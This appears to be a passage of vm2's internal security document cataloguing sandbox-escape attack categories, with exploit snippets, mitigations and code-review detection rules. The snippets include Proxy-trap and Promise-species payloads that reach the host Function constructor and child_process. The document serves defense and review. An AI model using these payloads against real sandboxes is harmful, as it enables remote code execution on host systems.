# Sandbox Escape Attack Patterns

This document catalogs known attack patterns used to circumvent the vm2 sandbox. It is intended for AI agents and reviewers evaluating new code contributions. Each section describes a category of attack, provides canonical examples, explains why it is dangerous, and lists detection heuristics for spotting similar patterns in contributed code.

---

## How to Use This Document

When reviewing a code contribution:

1. Check if any code (including test fixtures, examples, or "utility" helpers) matches the patterns below.
2. Pay special attention to code that accesses `.constructor`, `__proto__`, `Symbol.species`, `Proxy`, `Reflect`, or overrides built-in prototype methods.
3. Any code that attempts to obtain a reference to host-realm `Function`, `process`, `require`, or `child_process` from within sandbox context is an escape attempt.
4. The ultimate goal of almost every escape is: get a reference to the host `Function` constructor, then call `Function("return process")()` to access Node.js `process` and from there `require("child_process").execSync(...)`.

When documenting a new advisory, follow the [Category Entry Format](#category-entry-format) and verify the fix against the [Defense Invariants](#defense-invariants).

---

## Category Entry Format

Categories are organized into three tiers — Primitives (1–5), Techniques (6–15), Compound Attacks (16+). Add new entries under the appropriate tier with the next sequential number.

Each entry uses the following structure:

- **Heading**: `## Attack Category N: <Short title>`.
- **`**Uses**:`** — Tier 2 and Tier 3 only. Linked list of prerequisite categories this attack composes.
- **`**Supersedes**:`** — Optional. Link to an earlier category whose mitigation was specific rather than structural and is now subsumed by this fix.
- **`### Description`** — What the attacker can do and the underlying mechanism.
- **`### Attack Flow`** — Numbered step-by-step breakdown.
- **`### Canonical Example(s)`** — Code blocks. Include all known variants when multiple bypass paths exist.
- **`### Why It Works`** — Why the existing defenses didn't prevent this. Reference V8 internals where relevant.
- **`### Mitigation`** — The structural fix. Cite the file and function. Reference the [Defense Invariant](#defense-invariants) the fix enforces.
- **`### Detection Rules`** — Bulleted heuristics for spotting similar patterns in code review.
- **`### Considered Attack Surfaces`** — Optional. Adjacent surfaces analysed and ruled out, so future reviewers don't re-investigate.

If a new vulnerability fits an existing category, add it as an additional canonical example and update the Mitigation. Only create a new category for genuinely novel attack classes.

After adding an entry, also update:

- **Summary → How The Bridge Defends** — add a row mapping the attack to its defense.
- **Summary → Compound Attack Patterns** — for Tier 3, describe how the chain composes.
- **CHANGELOG.md** — one-line entry under the next release.

---

## Defense Invariants

These are the cross-cutting properties the sandbox must preserve. A fix that closes a specific PoC without restoring the relevant invariant is **specific** and will admit variants. A fix that restores the invariant at the right chokepoint is **structural**. Every Mitigation section should reference the invariant it enforces.

1. **No host-realm object reaches sandbox code unwrapped.** Every value crossing the boundary is a primitive, a sandbox-realm object, or a bridge proxy. `thisFromOther` / `ensureThis` is the single chokepoint; the WeakMap caches preserve identity.

2. **All caught exceptions are sanitized.** Every value entering a `catch` clause passes through `handleException`. Paths that bypass JS-level `catch` instrumentation (Wasm `try_table`, host-realm `Promise.then` rejection) are closed at the bridge.

3. **Cross-realm error containers are recursively sanitized.** `SuppressedError`, `AggregateError`, and `Error.cause` may carry host references in nested fields. `handleException` walks the structure with cycle detection.

4. **V8 internal algorithms cannot read attacker-controlled `constructor` on host objects.** ArraySpeciesCreate, PromiseResolveThenableJob, and similar C++ paths bypass proxy traps. The bridge neutralises raw `constructor` slots on host arrays before every host-side call (`neutralizeArraySpecies`) and pre-sets `Promise.constructor` as an own data property before `.then`/`.catch` (`resetPromiseSpecies`).

5. **`Error.prepareStackTrace` always resolves to a sandbox-realm safe default.** V8 must never fall back to the host's `prepareStackTraceCallback`. Setting `Error.prepareStackTrace = undefined` in the sandbox restores the safe default rather than removing it.

6. **Host-realm intrinsic prototypes are read-only from the sandbox.** `Object.prototype`, `Array.prototype`, `Function.prototype`, etc. cannot be polluted, deleted from, or frozen via bridge write traps. Mutability is preserved for non-intrinsic host objects (Buffer instances, embedder-exposed configs).

7. **Cross-realm well-known symbols are not extractable.** `Symbol.for('nodejs.util.inspect.custom')` and similar cross-realm symbols are filtered at the bridge so sandbox code cannot use them as a channel to register host-side callbacks.

8. **Reflect and dangerous-constructor identity is captured at init time.** The bridge caches `Reflect.*` references and built-in constructors before sandbox code runs. Sandbox-side monkey-patching of these cannot affect bridge internals.

9. **Post-ES2022 syntax is treated as a transformer blind spot.** `using`, `await using`, and any future syntax not understood by Acorn (`ecmaVersion: 2022`) bypasses catch instrumentation. Defenses must hold even when no transformer instrumentation runs over the relevant scope.

10. **Dynamic code compilation paths cannot reach an unwrapped host realm.** `Function`, `eval` with host references, and dynamic `import()` are blocked or proxied. `import()` throws `VMError` unconditionally.

11. **Bridge-internal containers must not invoke sandbox code.** Lists, maps, and saved-state records allocated for the bridge's exclusive use are reached from sandbox-realm closures whose intrinsics (`Array.prototype`, `Object.prototype`, `Map.prototype`) are attacker-reachable. Reads and writes on those containers must use prototype-bypassing primitives — `Reflect.defineProperty`, `Reflect.apply` over cached `WeakMap.prototype.{get,set}`, etc. — never operators (`obj[i] =`, `map.set`, `for...in`) that fall through to the sandbox prototype chain. Otherwise an attacker-installed setter/getter on `Array.prototype[N]` or `Object.prototype.<key>` can capture or mutate the bridge's raw saved state.

12. **No sandbox-visible object has a host-realm prototype chain without bridge interposition.** Every Promise (and, by extension, every spec-defined async dispatch target) reachable from sandbox code is either (a) sandbox-realm with `globalPromise.prototype` in its `[[Prototype]]` chain — so the sandbox-side `.then`/`.catch` overrides apply — or (b) a bridge proxy of a host-realm Promise — so the bridge `apply`-trap interception applies. A third shape (sandbox-realm allocation with a host-realm prototype, with no proxy in between) bypasses both layers: `p.then`/`.catch`/`.finally` lookup walks across realms to host native methods directly, `Object.defineProperty(p, 'constructor', ...)` writes onto the raw object, and V8's host-realm `SpeciesConstructor` dispatches the rejection through attacker-controlled species without ever invoking a sandbox-visible chokepoint. Any V8/Node primitive that produces such an object — WebAssembly JSPI is the first known one — must be neutralized at sandbox bootstrap. See [Category 33](#attack-category-33-webassembly-jspi-cross-realm-promise-prototype).

13. **The NodeVM builtin allowlist is a closed system.** No Node builtin whose own API can reload, evaluate, debug, spawn, or otherwise re-enter host code (`module`, `worker_threads`, `cluster`, `vm`, `repl`, `inspector`, `process`, `trace_events`, `wasi`) is reachable from the sandbox, regardless of how the embedder writes `builtin` — wildcard, explicit name, object syntax, low-level `makeBuiltins`. The check is family-prefix and `node:`-normalised, so subpath builtins (`inspector/promises`) and URL-style spellings (`node:process`) share fate with their canonical name. The only way to re-expose any of these names is to register a sandbox-safe wrapper through `SPECIAL_MODULES`, `mocks`, or `overrides` — i.e. the embedder must consciously opt into a stub that is not the raw host module.

The [Security Checklist for Bridge Changes](#security-checklist-for-bridge-changes) at the end of this document gives the verification questions for each invariant.

---

## Fundamentals

Before diving into specific attack categories, it is essential to understand the architectural constraints that make sandbox escapes possible and the design choices that shape the defense surface.

### Realm Separation

vm2 runs untrusted code inside a V8 context created by Node.js's `vm` module. Host and sandbox share the **same V8 isolate** -- they execute on the same thread, in the same heap. The sandbox gets its own set of global intrinsics (`Object`, `Function`, `Array`, `Error`, etc.), but these are all allocated from the same memory space as the host's intrinsics. There is no process boundary, no memory isolation, and no privilege separation at the OS level. If an attacker obtains a reference to any host-realm constructor, they can evaluate arbitrary code in the host context.

A "host-realm object" is any object whose prototype chain leads to the host's intrinsics. A "sandbox-realm object" leads to the sandbox's intrinsics. The bridge's job is to ensure that sandbox code never sees a host-realm object directly -- only proxied wrappers that sanitize every property access.

### The Bridge Proxy Model

`lib/bridge.js` is the core of vm2. It maintains two WeakMaps:

- **`mappingThisToOther`**: maps host objects to their sandbox proxy wrappers (and vice versa, depending on which side loaded the bridge).
- **`mappingOtherToThis`**: maps sandbox proxies back to the host objects they wrap.

When a host object crosses into the sandbox, `thisFromOther(other)` looks it up in `mappingThisToOther`. If already wrapped, the existing proxy is returned (identity preservation). If new, a proxy is created whose traps sanitize every property access, method call, and prototype traversal.

The **proxy invariant problem**: proxies preserve object identity (the same host object always maps to the same sandbox proxy), but every trap is an attack surface. Each trap must correctly handle attacker-controlled inputs, V8 internal algorithm invocations, and edge cases like non-configurable properties. The bridge is essentially a manually-written membrane, and any gap in the membrane is a potential escape.

### V8 Internal Algorithms vs JS-Level Code

This is the **root cause** of most attacks in this document. V8 implements many specification algorithms in C++ (ArraySpeciesCreate, FormatStackTrace, PromiseResolveThenableJob, etc.). These C++ algorithms operate on raw object pointers, **bypassing proxy traps entirely** in many cases. When V8's C++ code reads `obj.constructor` for species resolution, it reads the actual property on the underlying object -- not the proxy's `get` trap return value. When V8's stack formatter calls `Error.toString()`, it runs in whatever realm created the error.

This means: **any defense that relies solely on proxy traps is incomplete**. The bridge must also neutralize the raw objects themselves (e.g., setting `constructor = undefined` directly on host arrays) and control V8-level hooks (e.g., `Error.prepareStackTrace`).

### The Transformer's Role

`lib/transformer.js` uses Acorn to parse sandbox code and instrument it:

- **`catch` blocks**: Wrapped so that `handleException(e)` is called on every caught value. This sanitizes host-realm errors that V8 might throw (e.g., TypeError from type coercion failures).
- **`with` statements**: Instrumented to prevent scope chain manipulation.

`handleException` (defined in `lib/setup-sandbox.js`) calls `ensureThis` on the caught value, which walks the prototype chain and converts host objects to sandbox proxies. It also detects `SuppressedError` instances and recursively sanitizes their `.error` and `.suppressed` properties.

**Critical limitation**: The transformer uses Acorn with `ecmaVersion: 2022`. Syntax introduced after ES2022 -- notably `using` declarations (ES2024) -- is invisible to the transformer. Code using `using` inside `eval()` bypasses catch-block instrumentation entirely.

### The Error Generation Primitive

A pattern that appears in nearly every compound attack:

```javascript
const e = new Error();
e.name = Symbol();  // Symbol cannot be converted to string
e.stack;            // V8's C++ FormatStackTrace calls e.toString() -> TypeError
```

When V8 formats a stack trace, its C++ code calls `Error.prototype.toString()`, which concatenates `this.name + ": " + this.message`. If `name` is a `Symbol`, the string concatenation throws a `TypeError`. Depending on where this TypeError is caught, it may be a **host-realm** error (if the formatting happened in host-side code like `prepareStackTraceCallback`) or a sandbox-realm error (if the sandbox's `prepareStackTrace` handled it). This primitive generates host errors on demand and is referenced throughout this document.

### The `isHost` Asymmetry

The bridge is loaded in both the host and the sandbox, but the security requirement is asymmetric: **only the sandbox side needs protection from leaking host objects**. The host side freely receives sandbox objects (they cannot harm the host). This means the bridge's proxy traps are primarily defensive on the sandbox-facing side: the `get` trap blocks dangerous constructors, the `ownKeys` trap filters dangerous symbols, the `apply` trap neutralizes species attacks, etc.

### The Escape Chain

Almost every escape follows this progression:

```
Sandbox Object
  -> Host Constructor (Function)
    -> Code Evaluation ("return process")
      -> process.mainModule.require
        -> require("child_process")
          -> execSync("arbitrary command")
```

Block **any** step in this chain, and the escape fails. The bridge blocks step 1 (constructor access). The transformer blocks catch-clause access. Promise sanitization blocks async paths to step 2. Defense in depth means multiple layers must be bypassed for a successful escape.

---

# Tier 1 -- Primitives

These are atomic building blocks that appear in nearly every exploit. Each primitive provides one piece of the escape chain.

---

## Attack Category 1: Constructor Chain Traversal

### Description

Every object in JavaScript has a `.constructor` property pointing to the function that created it. By walking up the constructor chain (`obj.constructor.constructor`), an attacker can reach the `Function` constructor of the host realm, which can evaluate arbitrary code outside the sandbox.

### Attack Flow

1. Obtain any host-realm object (via bridge-exposed built-in, error, or prototype traversal).
2. Access `.constructor` to get the object's constructor function.
3. Access `.constructor` again to get `Function` (since every function's constructor is `Function`).
4. Call `Function("return process")()` to get the host `process` object.
5. `process.mainModule.require("child_process").execSync(...)` for RCE.

### Canonical Examples

```javascript
// Direct global constructor chain
const HostFunction = this.constructor.constructor;
const process = HostFunction("return process")();

// Via __proto__
const process = global.__proto__.constructor.constructor("return this")()
  .constructor.constructor("return process")();

// Via an error object in catch
try { undefinedFunction(); }
catch (e) {
  const HostFunction = e.constructor.constructor;
  const process = HostFunction("return process")();
}
```

### Why It Works

The sandbox shares the same V8 isolate as the host. If constructors are not intercepted, the prototype chain eventually reaches the host realm's `Function`, which can compile and run code in the host context.

### Mitigation

The bridge's `get` trap intercepts `.constructor` access on proxied objects and returns `{}` (an empty object) for dangerous function constructors (Function, AsyncFunction, GeneratorFunction, AsyncGeneratorFunction). The `isThisDangerousFunctionConstructor` check blocks both this-realm and other-realm Function constructors.

### Detection Rules

- **Any access to `.constructor.constructor`** on any object is suspicious.
- **`Function("return process")()`** or equivalent string-to-code patterns.
- **`e.constructor`** inside a `catch` block where `e` is an error -- the error might carry host prototype references.
- **`global.constructor`**, `this.constructor`, or any object's `.constructor` followed by invocation with a string argument.

---

## Attack Category 2: Prototype Chain Manipulation

### Description

Attackers modify or traverse the prototype chain to access host objects or pollute shared prototypes to intercept security-critical operations.

### Attack Flow

1. Traverse `__proto__` chains to reach host-realm prototypes.
2. Alternatively, pollute `Object.prototype` with getter/setter traps that intercept bridge-internal property access.
3. When the bridge copies property descriptors or checks types, the polluted prototype injects attacker code.

### Canonical Examples

```javascript
// Climbing via __proto__
const hostObject = obj.__proto__.__proto__;

// Prototype pollution to intercept property descriptors
Object.defineProperty(Object.prototype, "get", {
  get() {
    throw f => f.constructor("return process")();
  }
});

// Setting prototype to bypass instanceof checks
Object.setPrototypeOf(promise, {});

// __defineGetter__ on prototypes
Buffer.prototype.__defineGetter__("toString", () => {});
```

### Why It Works

Prototype pollution can intercept property descriptor operations that the bridge uses internally. If an attacker can define a `get` or `set` trap on `Object.prototype`, they can hijack the bridge's own property copying logic. Additionally, `__proto__` traversal can reach host-realm prototypes that were not properly proxied.

### Mitigation

The bridge uses null-prototype objects (`{__proto__: null}`) for all internal descriptor operations. `__proto__` access is intercepted by the proxy `get` trap and returns the sandbox-side prototype. The bridge caches all critical `Reflect.*` methods at initialization, preventing monkey-patching.

### Detection Rules

- **`Object.defineProperty(Object.prototype, ...)`** -- polluting the root prototype.
- **`__defineGetter__`** or **`__defineSetter__`** on any prototype object.
- **`Object.setPrototypeOf`** or **`Reflect.setPrototypeOf`** -- changing prototype chains.
- **`__proto__` access or assignment** -- direct prototype manipulation.
- **`__lookupGetter__`** or **`__lookupSetter__`** -- accessing internal getter/setter references.

---

## Attack Category 3: Symbol-Based Attacks

### Description

JavaScript Symbols provide special protocol hooks (`Symbol.species`, `Symbol.hasInstance`, `Symbol.iterator`, etc.) that can override fundamental behaviors. Attackers use these to bypass type checks or redirect object construction. See also [Category 10: Array Species Self-Return](#attack-category-10-array-species-self-return-via-constructor-manipulation) for a concrete exploitation of `Symbol.species`.

### Attack Flow

1. Identify a V8 internal algorithm that reads a well-known symbol (e.g., `Symbol.species` for promise/array construction, `Symbol.hasInstance` for `instanceof` checks).
2. Override the symbol on a target object to redirect the algorithm's behavior.
3. The redirected behavior causes V8 to pass unsanitized host values to attacker-controlled code.

### Canonical Examples

```javascript
// Symbol.hasInstance to bypass instanceof
Object.__defineGetter__(Symbol.hasInstance, () => () => true);
Buffer.from.constructor("return process")();

// Symbol.hasInstance override to bypass resetPromiseSpecies guard
const GP = Object.getPrototypeOf(Promise); // gets globalPromise
Object.defineProperty(GP, Symbol.hasInstance, {value: () => false});
// Now `p instanceof globalPromise` returns false, skipping species reset
const p = asyncFn();
p.constructor = { [Symbol.species]: MaliciousPromise };
p.then(); // resetPromiseSpecies skipped due to instanceof bypass

// Symbol.species to redirect Promise construction
const p = asyncFn();
p.constructor = {
  [Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(x => x, err => {
        // err might be unsanitized host error
        const HostFunction = err.constructor.constructor;
        HostFunction("return process")();
      });
    }
  }
};
p.then();

// Symbol.species getter TOCTOU -- returns safe value on first read, malicious on second
const p = asyncFn();
p.constructor = {
  get [Symbol.species]() {
    if (first) { first = false; return Promise; } // passes check
    return FakePromise; // V8 uses this for species resolution
  }
};
p.then();

// Error with Symbol name triggering host error path (see Fundamentals: Error Generation Primitive)
const error = new Error();
error.name = Symbol(); // toString() on Symbol throws TypeError
```

### Why It Works

`Symbol.species` controls what constructor is used when built-in methods create derived objects (e.g., `Promise.then` creates a new promise). If an attacker substitutes a custom class, that class's constructor receives host-realm values. `Symbol.hasInstance` controls `instanceof` checks that the bridge might rely on for type verification.

### Mitigation

`globalPromise` and `globalPromise.prototype` are frozen in `setup-sandbox.js`, preventing `Symbol.hasInstance` and `Symbol.species` overrides. Promise species is reset unconditionally via `Reflect.defineProperty` (data property, not accessor) before every `.then()`/`.catch()` call, eliminating TOCTOU. For arrays, `neutralizeArraySpecies` sets `constructor = undefined` on host arrays before/after host function calls.

### Detection Rules

- **`Symbol.species`** usage, especially assignment to `.constructor[Symbol.species]`.
- **`Symbol.species` as a getter** -- TOCTOU attack returning different values on each access.
- **`Symbol.hasInstance`** override via `__defineGetter__` or `Object.defineProperty`.
- **`Object.getPrototypeOf(Promise)`** -- accessing `globalPromise` to override its `Symbol.hasInstance`.
- **`Symbol.for()`** -- can create cross-realm shared symbols.
- **Any Symbol used as `error.name`** -- triggers `TypeError` on string conversion which may leak host errors.
- **`Symbol.iterator`** or **`Symbol.toPrimitive`** overrides -- can execute code during iteration or coercion.
- **Extraction of real symbols from host objects** -- see also [Category 8: Cross-Realm Symbol Extraction](#attack-category-8-cross-realm-symbol-extraction-from-host-objects).

---

## Attack Category 4: Error Object Exploitation

### Description

Errors carry stack traces, constructor references, and can trigger special V8 APIs. Attackers use errors as vehicles to access host-realm objects. The Error Generation Primitive (see Fundamentals) is the most common technique: setting `error.name = Symbol()` forces a host TypeError during V8's C++ stack formatting.

### Attack Flow

1. Create an error and manipulate it (e.g., set `name` to a Symbol, or override `prepareStackTrace`).
2. Access `.stack` to trigger V8's stack formatting, which may throw a host-realm TypeError.
3. Catch the TypeError (via catch block, promise rejection, or SuppressedError) to obtain a host-realm error object.
4. Traverse the host error's constructor chain to reach host `Function`.

### Canonical Examples

```javascript
// Error.prepareStackTrace to access CallSite objects
Error.prepareStackTrace = (err, callSites) => {
  return callSites.map(cs => cs.getThis()).find(x => x);
};
const { stack } = new Error();
// stack now contains host objects

// Stack overflow to trigger host error constructor
function recurse() { new Error().stack; recurse(); }
try { recurse(); }
catch (e) {
  // e is host RangeError with host constructor
  e.constructor.constructor("return process")();
}

// Error in Promise rejection path (uses Error Generation Primitive)
async function fn() {
  const e = new Error();
  e.name = Symbol(); // Forces host TypeError during string conversion
  return e.stack;
}
fn().catch(hostError => {
  hostError.constructor.constructor("return process")();
});
```

### Why It Works

V8's `Error.prepareStackTrace` API provides access to CallSite objects that reference the actual `this` value of each stack frame. Stack overflow errors are created by the engine itself and may carry host-realm prototypes. The Error Generation Primitive (`e.name = Symbol(); e.stack`) forces V8's C++ code to throw a TypeError during string formatting; if this happens in host-side code (like `prepareStackTraceCallback`), the TypeError is a host-realm error.

### Mitigation

`Error.prepareStackTrace` is initialised to `defaultSandboxPrepareStackTrace` at sandbox bootstrap (post-GHSA-v27g hardening) and the property descriptor's setter substitutes the safe default whenever sandbox code assigns a non-function value (`undefined`, `null`, etc.). V8 therefore never falls through to Node's host-side `prepareStackTraceCallback` (which throws on Symbol-named errors and emits absolute host paths). `defaultSandboxPrepareStackTrace` itself handles Symbol names, Proxy objects, and other exotic types without throwing. CallSite metadata getters (`getFileName`, `getLineNumber`, `getFunctionName`, etc.) redact host frames; `getEvalOrigin` redacts unconditionally because its return string can embed a host path. CallSite `getThis()` and `getFunction()` always return `undefined`. `SuppressedError` and `AggregateError` are in `errorsList` in `bridge.js` so their prototypes are proto-mapped and their bridge-crossing instances structurally-collapsed.

### Detection Rules

- **`Error.prepareStackTrace`** assignment -- accessing V8 stack internals.
- **Recursive functions designed to cause stack overflow** -- intentional `RangeError` creation.
- **`error.name = Symbol()`** -- forces TypeError during string coercion (Error Generation Primitive).
- **Accessing `.stack` property on errors** in conjunction with prepareStackTrace.
- **Errors with unusual prototype manipulation** before throwing.
- **`Error.cause`** -- set by user code (not V8 internals), so `ensureThis` handles it; but worth noting as a potential carrier of host references.

---

## Attack Category 5: Function Caller/Callee Access

### Description

The `arguments.callee.caller` chain and function `caller`/`arguments` properties can leak references to functions higher in the call stack, potentially including bridge internals.

### Attack Flow

1. Define a function in the sandbox that accesses `arguments.callee.caller` or `fn.caller`.
2. Arrange for this function to be called by a bridge function (e.g., as a callback passed to a host API).
3. `.caller` returns the bridge function, whose `.constructor` is the host `Function`.

### Canonical Examples

```javascript
// arguments.callee.caller
(function() {
  return arguments.callee.caller;
})();

// Function.caller
function exploit() {
  return exploit.caller.constructor;
}

// arguments access on wrapped functions
function f() {
  return f.arguments[0]; // Might be host object
}
```

### Why It Works

If a sandbox function is called by a bridge function (host-realm), accessing `.caller` on the sandbox function returns the bridge function, which has a host-realm `constructor` (the host `Function`).

### Mitigation

The bridge throws immediately on `.caller` and `.arguments` access.

### Detection Rules

- **`arguments.callee`** -- accessing the calling function.
- **`arguments.callee.caller`** -- walking up the call stack.
- **`.caller` property** on any function.
- **`.arguments` property** on any function (the deprecated property, not the local `arguments` object).

---

# Tier 2 -- Techniques

These are mechanisms for delivering primitives. Each technique provides a way to trigger, amplify, or chain the Tier 1 primitives into actual escapes.

---

## Attack Category 6: Proxy Trap Exploitation

### Description

The `Proxy` constructor allows intercepting fundamental operations on objects. Attackers create Proxies with trap handlers that execute when the bridge processes values, allowing them to inject code at points where the bridge may pass unsanitized references. See also [Category 2: Prototype Chain Manipulation](#attack-category-2-prototype-chain-manipulation) for combining proxy traps with prototype pollution.

### Attack Flow

1. Create a Proxy with a trap handler (e.g., `getOwnPropertyDescriptor`, `getPrototypeOf`, `construct`).
2. Pass the Proxy to a host function (e.g., `Buffer.from()`) that the bridge will inspect.
3. When the bridge inspects the Proxy's properties, the trap executes.
4. The trap either throws a function (which receives host references as arguments in the catch block) or modifies `Object.prototype` to inject further traps.

### Canonical Examples

```javascript
// Throw function from getOwnPropertyDescriptor trap
Buffer.from(new Proxy({}, {
  getOwnPropertyDescriptor() {
    throw f => f.constructor("return process")();
  }
}));

// getPrototypeOf trap to pollute Object.prototype
Object.defineProperty(Buffer.from(""), "y", {
  value: new Proxy({}, {
    getPrototypeOf(target) {
      Object.defineProperty(Object.prototype, "get", {
        get() {
          throw f => f.constructor("return process")();
        }
      });
      return Object.getPrototypeOf(target);
    }
  })
});

// Construct trap returning a function
new Proxy(class A {}, {
  construct() {
    return function() {
      return Object.getPrototypeOf(this).constructor.constructor("return process")();
    };
  }
});

// instanceof bypass via getPrototypeOf
throw new Proxy({}, {
  getPrototypeOf: () => {
    throw x => x.constructor.constructor("return process")();
  }
});
```

### Why It Works

The bridge must inspect and copy properties of objects that cross the boundary. If those objects are Proxies, the trap handlers execute in a context where unsanitized host references might be available as arguments.

### Mitigation

The bridge wraps the Proxy constructor to sanitize handler objects. Proxy handlers inherit from null-prototype objects to prevent `Object.prototype` pollution from affecting trap resolution. `Proxy.revocable` is also considered: revocation creates errors in the realm where the proxy was created, so it does not introduce cross-realm errors.

### Detection Rules

- **`new Proxy(...)`** with trap handlers, especially: `getPrototypeOf`, `getOwnPropertyDescriptor`, `has`, `get`, `set`, `apply`, `construct`.
- **Throwing from within a Proxy trap** -- the thrown value might be a function that receives host references.
- **Proxy traps that modify `Object.prototype`** -- combining proxy exploitation with prototype pollution.
- **Proxy as argument to host functions** like `Buffer.from()`, where the bridge will inspect the proxy's properties.
- **`Proxy.revocable`** -- revocation creates TypeError in the proxy's realm; not directly exploitable but worth monitoring.

---

## Attack Category 7: Promise and Async Exploitation

### Description

Promises and async functions create deferred execution paths where callbacks may be invoked with values that haven't been properly sanitized by the bridge. The internal mechanics of Promise resolution can be exploited. This category combines [Category 3: Symbol-Based Attacks](#attack-category-3-symbol-based-attacks) (species) with async error paths.

### Attack Flow

1. Obtain a promise (from an async function, `Promise.resolve()`, or a host API).
2. Set `promise.constructor` to an object with `Symbol.species` pointing to a malicious class.
3. Call `.then()` which triggers V8's species resolution, creating a new promise via the malicious class.
4. The malicious class's executor receives unsanitized host errors.

Alternatively:
1. Steal a Promise static method (`FakePromise.all = Promise.all`).
2. Call it so `this` is `FakePromise`, which V8 uses as the constructor for the result promise.
3. Trigger an error during the operation (iteration error, callback error).
4. The unsanitized error goes to `FakePromise`'s reject handler.

### Canonical Examples

```javascript
// Override Function.prototype.call to intercept Promise internals
const origCall = Function.prototype.call;
Function.prototype.call = function(...args) {
  captured.push(this);
  return origCall.apply(this, args);
};
Promise.resolve().then(() => {});

// Symbol.species + Promise.then to get unsanitized rejection
const p = Promise.resolve();
p.constructor = { [Symbol.species]: FakePromise };
p.then(null, hostErr => {
  hostErr.constructor.constructor("return process")();
});

// Constructor getter TOCTOU -- accessor returns safe value to pass check,
// malicious value when V8 reads it for species resolution
async function fn() {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}
let first = true;
const p = fn();
Object.defineProperty(p, 'constructor', {get(){
  if (first) {first = false; return Promise;} // passes resetPromiseSpecies check
  return {[Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(
        (x) => x,
        (err) => { err.constructor.constructor('return process')(); }
      )
    }
  }};
}});
p.then();

// Prototype-level constructor getter TOCTOU
const realProto = Object.getPrototypeOf(Promise.prototype); // globalPromise.prototype
let first = true;
Object.defineProperty(realProto, 'constructor', {configurable: true, get(){
  if (first) {first = false; return Promise;}
  return {[Symbol.species]: FakePromise};
}});
const p = fn();
p.then(); // own-property check sees nothing, prototype getter exploited

// Static method stealing -- multiple Promise static methods are vulnerable
function FakePromise(executor) {
  executor(
    (x) => x,
    (err) => { err.constructor.constructor('return process')(); }
  )
}

// Promise.all/race/any/allSettled -- vulnerable via iteration errors
FakePromise.all = Promise.all;
FakePromise.resolve = () => {};
FakePromise.all({[Symbol.iterator]: () => {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}});

// Promise.try (ES2024) -- vulnerable via callback errors
FakePromise.t = Promise.try;
FakePromise.t(() => {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
});

// Reflect.construct instanceof bypass
function FakePromise(executor) {
  executor(
    (x) => x,
    (err) => { err.constructor.constructor('return process')(); }
  )
}
FakePromise[Symbol.species] = FakePromise;
const res = Reflect.construct(Promise, [()=>{
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}], FakePromise);
res.then = Promise.prototype.then;
res.then();
// resetPromiseSpecies used 'instanceof globalPromise' which returned false

// Override Object.defineProperty to prevent species reset
Object.defineProperty = () => {};
async function fn() { /* trigger host error */ }
fn().then(() => {}, unsanitizedErr => { /* escape */ });

// Object.freeze to prevent species cleanup
p.constructor = Object.freeze({
  [Symbol.species]: MaliciousPromise
});
```

### Why It Works

Promise resolution invokes callbacks asynchronously. If `Function.prototype.call` is overridden, the bridge's internal calls to `.call()` on callbacks can be intercepted. If `Symbol.species` is set to a custom class, the new promise's executor receives unsanitized host values.

The TOCTOU (Time-Of-Check-Time-Of-Use) variants exploit the gap between when the bridge reads `p.constructor` (to check if it's safe) and when V8 internally reads it (for species resolution). JavaScript accessor properties (getters) can return different values on each access, making any check-then-use pattern on a getter fundamentally unsafe. This applies at both the instance level and the prototype level.

The static method stealing variant exploits Promise static methods that use `this` as the constructor for the result promise. When an attacker copies these methods to a FakePromise constructor, the method uses FakePromise to create the result promise. If an error occurs during the operation, the unsanitized host error goes directly to FakePromise's reject handler.

Specifically vulnerable methods:
- **`Promise.all/race/any/allSettled`**: Catch errors during iteration and pass them to the result promise's reject handler.
- **`Promise.try`** (ES2024): Catches errors thrown by the callback inside V8's Promise executor.
- **`Promise.resolve`**: Catches errors during thenable resolution.

Methods that are NOT vulnerable:
- **`Promise.reject/withResolvers`**: Errors come from user code, not V8 internals.

### Mitigation

All Promise static methods (`.all`, `.race`, `.any`, `.allSettled`, `.resolve`, `.reject`, `.try`, `.withResolvers`) are wrapped to always use `localPromise` as constructor, ignoring `this`. Species is reset unconditionally via `Reflect.defineProperty` (data property, not accessor) before every `.then()`/`.catch()`, eliminating TOCTOU. `globalPromise` and `globalPromise.prototype` are frozen. The `Reflect.construct` instanceof bypass is blocked because `resetPromiseSpecies` sets constructor on any object, not just `instanceof globalPromise`.

A separate structural defense closes the **host-Promise rejection callback** class (GHSA-55hx-c926-fr95): when sandbox code calls `.then` / `.catch` / `.finally` on a host-realm Promise (returned from an embedder-exposed async function or a sync function that returns a host promise), the bridge `apply` trap on the sandbox side recognizes the host Promise method by identity (cached references to `otherGlobalPrototypes.Promise.{then,catch,finally}`) and wraps every supplied callback with a sandbox-realm closure that runs `handleException` (rejection) or `ensureThis` (fulfillment) on its argument before invoking the user callback. This routes raw host rejection values through the same recursive sanitizer used for sandbox-realm promises, restoring the invariant that **no callback the sandbox supplies to a Promise -- regardless of which realm the Promise was constructed in -- ever sees an unsanitized argument**.

### Detection Rules

- **Override of `Function.prototype.call`**, `.apply`, or `.bind` -- intercepting internal method dispatch.
- **`promise.constructor = { [Symbol.species]: ... }`** -- redirecting promise construction.
- **`Object.defineProperty(p, 'constructor', {get(){...}})`** -- constructor getter TOCTOU on instance.
- **`Object.defineProperty(Object.getPrototypeOf(Promise.prototype), 'constructor', ...)`** -- constructor getter TOCTOU via prototype.
- **`Object.getPrototypeOf(Promise)`** -- accessing `globalPromise` to override `Symbol.hasInstance`.
- **`Object.defineProperty = () => {}`** -- disabling bridge safety mechanisms.
- **`Object.freeze()` on objects with `Symbol.species`** -- preventing cleanup.
- **`FakeConstructor.all = Promise.all`** (or `.race`, `.any`, `.allSettled`, `.resolve`, `.try`) -- stealing Promise static methods.
- **`Reflect.construct(Promise, [...], FakeNewTarget)`** -- creates real Promise with `FakeNewTarget.prototype`, bypassing `instanceof` checks.
- **Async functions that deliberately trigger errors** during string conversion or property access.
- **Embedder-exposed `async () => {}` host function** chained with `.finally(() => /* throw */).catch(handler)` -- now intercepted at the bridge `apply` trap with callback sanitization.

---

## Attack Category 8: Cross-Realm Symbol Extraction from Host Objects

### Description

